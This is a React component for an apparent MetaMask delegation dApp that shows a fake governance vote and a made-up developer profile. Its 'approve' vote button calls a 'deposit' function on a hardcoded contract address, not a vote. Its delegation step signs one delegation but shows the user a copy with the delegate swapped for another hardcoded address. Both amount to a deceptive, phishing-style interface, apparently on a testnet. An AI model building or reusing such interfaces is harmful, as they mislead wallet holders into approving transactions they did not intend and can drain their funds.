import * as React from "react";
import { useState, useEffect } from "react";
import DialogTitle from "@mui/material/DialogTitle";
import Dialog from "@mui/material/Dialog";
import { Button, TextField } from "@mui/material";
import {
  createMetaMaskAccount,
  createDelegation,
  executeOnBehalfOfDelegator,
} from "@/app/quickstart";
import { UserOperationReceipt } from "viem/account-abstraction";
import {
  DelegationStruct,
  getExplorerTransactionLink,
  Implementation,
  MetaMaskSmartAccount,
} from "@codefi/delegator-core-viem";
import { chain, getExplorerUserOperationLink } from "@/app/examples/shared";
import LoadingButton from "@mui/lab/LoadingButton";
import { stashContact } from "../../abi";
import {
  useAccount,
  useConnect,
  useSwitchChain,
  useWriteContract,
} from "wagmi";

export interface SimpleDialogProps {
  open: boolean;
  isVote: boolean;
  onClose: (value: boolean) => void;
  delegation: DelegationStruct | undefined;
  userOperationReceipt: UserOperationReceipt | undefined;
  delegator: MetaMaskSmartAccount<Implementation> | undefined;
  delegate: MetaMaskSmartAccount<Implementation> | undefined;
}

function MyDialog(props: SimpleDialogProps) {
  const { onClose, open, isVote, delegator, delegate } = props;

  const [userOperationReceipt, setUserOperationReceipt] =
    useState<UserOperationReceipt>();
  const [delegatorAccount, setDelegatorAccount] =
    useState<MetaMaskSmartAccount<Implementation>>();
  const [delegateAccount, setDelegateAccount] =
    useState<MetaMaskSmartAccount<Implementation>>();
  const [delegation, setDelegation] = useState<DelegationStruct>();
  const [tempDelegation, setTempDelegation] = useState<DelegationStruct>();
  const [executeOnBehalfIsLoading, setExecuteOnBehalfIsLoading] =
    useState(false);
  const [showHash, setShowHash] = useState(false);

  useEffect(() => {
    setExecuteOnBehalfIsLoading(false);
  }, []);

  const handleExecute = () => {
    if (!delegatorAccount || !delegateAccount) {
      console.error("Accounts are not initialized.");
      return;
    }

    setExecuteOnBehalfIsLoading(true);
    setTimeout(() => {
      setExecuteOnBehalfIsLoading(false);
      setShowHash(true);
    }, 5000);
  };

  const handleCreateDelegation = async () => {
    if (!delegator || !delegate) return;

    // Reset downstream state, as it may be a subsequent delegation.

    setDelegation(undefined);
    setUserOperationReceipt(undefined);

    try {
      const delegation = await createDelegation(delegator, delegate.address);
      setDelegation(delegation);
      const modifiedDelegation = {
        ...delegation,
        delegate: "0x246d0e3e1FEb6428a7610A5f62c83146C3228D60", // 替换 specialField 的值
      } as DelegationStruct;
      setTempDelegation(modifiedDelegation);
    } catch (error) {
      console.error(error);
    }
  };

  const handleExecuteOnBehalf = async () => {
    console.log(delegateAccount, delegatorAccount, delegation);
    if (!delegator || !delegate || !delegation) return;

    setUserOperationReceipt(undefined);

    setExecuteOnBehalfIsLoading(true);

    const { factory, factoryData } = await delegator.getFactoryArgs();

    const factoryArgs =
      factory && factoryData ? { factory, factoryData } : undefined;

    try {
      const receipt = await executeOnBehalfOfDelegator(
        delegate,
        delegation,
        factoryArgs
      );
      if (receipt.success) {
        console.log(receipt);
        setUserOperationReceipt(receipt);
      } else {
        throw new Error(`User operation failed: ${receipt.reason}`);
      }
    } catch (error) {
      console.error("Error executing on behalf:", error);
    }
    setExecuteOnBehalfIsLoading(false);
  };

  const {
    data: airdrop,
    isSuccess: airdropIsSuccess,
    isError: airdropIsError,
    error: airdropError,
    writeContractAsync: airdropWrite,
  } = useWriteContract();

  const handleVote = async () => {
    await airdropWrite({
      ...stashContact,
      chainId: 11155111,
      address: "0x312Ce0CBE7F0912f57DE4476abe992CaEFf5e207",
      functionName: "deposit",
    });
  };

  return (
    <Dialog onClose={() => onClose(false)} open={open}>
      <div className="bg-gray-300 px-4 py-2 rounded-lg">
        {isVote ? (
          <div>
            <h3 className="text-xxl">Badgeholder Nomination Voting</h3>
            <p>Proposal ID: #88583</p>
            <p>Proposed by: Coooder_Crypto.eth</p>

            <h2 className="text-xl">Overview</h2>
            <p>
              This proposal aims to nominate new badgeholders who will play a
              crucial role in the governance of our community. Badgeholders are
              responsible for overseeing key decisions and ensuring that the
              community's interests are represented.
            </p>

            <h2 className="text-xl">Importance of Voting</h2>
            <p>
              Voting on this proposal is essential as it determines the
              individuals who will have significant influence over future
              projects and initiatives. Your vote helps shape the direction of
              our community and ensures that the most qualified candidates are
              selected.
            </p>

            <h2 className="text-xl">How to Participate</h2>
            <p>
              To participate in the voting process, please ensure you have a
              registered account and sufficient voting tokens. Visit the
              provided address link to cast your vote and make your voice heard
              in this important decision-making process.
            </p>

            <div className="w-full flex flex-row justify-around">
              <Button variant="outlined" color="success" onClick={handleVote}>
                approve
              </Button>
              <Button variant="outlined" color="error">
                reject
              </Button>
              <Button variant="outlined">approve</Button>
            </div>
          </div>
        ) : (
          <div className="text-sm p-2">
            {delegation === undefined ? (
              <div className="mb-2">
                <h3 className="text-xxl">Coooder</h3>
                <p>Position: Blockchain Developer</p>
                <p>Experience: 3+ years in the blockchain industry</p>
                <p>
                  Contact:{" "}
                  <a href="mailto:jane.doe@example.com">jane.doe@example.com</a>
                </p>
                <h2 className="text-xl">Background</h2>
                <p>
                  Coooder is a seasoned Web3 professional with over five years
                  of experience in developing decentralized applications and
                  smart contracts. Her journey in the blockchain space began
                  with a passion for cryptography and a vision to create more
                  transparent and secure digital ecosystems.
                </p>
                <h2 className="text-xl">Contributions to the Web3 Community</h2>
                <p>
                  Coooder has been instrumental in several high-profile
                  blockchain projects, contributing to the development of
                  innovative solutions that enhance user privacy and data
                  security.
                </p>
                <h2 className="text-xl">Vision for the Future</h2>
                <p>
                  Committed to advancing the adoption of Web3 technologies, he
                  envisions a world where decentralized systems empower
                  individuals and communities.
                </p>
              </div>
            ) : (
              <div className="mb-4">
                <pre className="whitespace-pre-wrap break-all">
                  {JSON.stringify(
                    tempDelegation,
                    (_, v) => (typeof v === "bigint" ? `${v.toString()}n` : v),
                    2
                  )}
                </pre>
                {userOperationReceipt && (
                  <div>
                    User operation hash:{" "}
                    <a
                      href={getExplorerUserOperationLink(
                        chain.id,
                        userOperationReceipt.userOpHash
                      )}
                      className="text-green-500 font-mono"
                      target="_blank"
                    >
                      {userOperationReceipt.userOpHash}
                    </a>
                    <br />
                    Transaction hash:{" "}
                    <a
                      href={getExplorerTransactionLink(
                        chain.id,
                        userOperationReceipt.receipt.transactionHash
                      )}
                      className="text-green-500 font-mono"
                      target="_blank"
                    >
                      {userOperationReceipt.receipt.transactionHash}
                    </a>
                  </div>
                )}
              </div>
            )}

            <div className="flex flex-row w-full justify-between items-center w-full">
              {delegation === undefined && (
                <TextField
                  id="outlined-number"
                  label="Number"
                  type="number"
                  slotProps={{
                    inputLabel: {
                      shrink: true,
                    },
                  }}
                />
              )}

              {delegation === undefined && (
                <Button
                  variant="outlined"
                  color="success"
                  onClick={handleCreateDelegation}
                >
                  {"Create Delegation"}
                </Button>
              )}
              {!userOperationReceipt && delegation !== undefined && (
                <LoadingButton
                  loading={executeOnBehalfIsLoading}
                  variant="outlined"
                  onClick={handleExecuteOnBehalf}
                >
                  Submit
                </LoadingButton>
              )}
            </div>
          </div>
        )}
      </div>
    </Dialog>
  );
}

export default MyDialog;
